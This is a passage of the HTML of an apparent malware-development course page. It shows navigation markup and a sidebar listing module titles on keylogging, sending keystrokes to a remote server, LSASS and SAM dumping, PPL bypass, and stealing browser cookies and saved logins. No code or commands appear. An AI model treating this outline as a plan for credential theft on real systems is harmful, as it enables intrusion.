                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html&amp;toc=true">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html&amp;toc=true">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html&amp;toc=true">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html&amp;toc=true">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html&amp;toc=true">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html&amp;toc=true">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html&amp;toc=true">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html&amp;toc=true">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html&amp;toc=true">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html&amp;toc=true">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html&amp;toc=true">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html&amp;toc=true">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html&amp;toc=true">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html&amp;toc=true">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html&amp;toc=true">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html&amp;toc=true">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html&amp;toc=true">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./26.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html?toc=true">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./27/complete" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-emerald-600/85 to-emerald-700/85
             hover:from-emerald-500/85 hover:to-emerald-600/85
             border border-emerald-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 ">Complete</button>
      </form>
      <form id="uncomplete-module" action="./2#" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-rose-600/85 to-rose-700/85
             hover:from-rose-500/85 hover:to-rose-600/85
             border border-rose-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 hidden">Undo</button>
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./28.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>


      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="27_files/jquery-3.6.0.min.js"></script>
        <script src="27_files/bootstrap.min.js"></script>
        <script src="27_files/navbar.js"></script>
        

<link rel="preload" as="style" href="27_files/app-BoiX-DPv.css"><link rel="modulepreload" href="27_files/app-D9jIIQde.js"><link rel="stylesheet" href="27_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="27_files/app-D9jIIQde.js"></script><script src="27_files/moduleviewer.js" defer="defer"></script>

    
</body></html>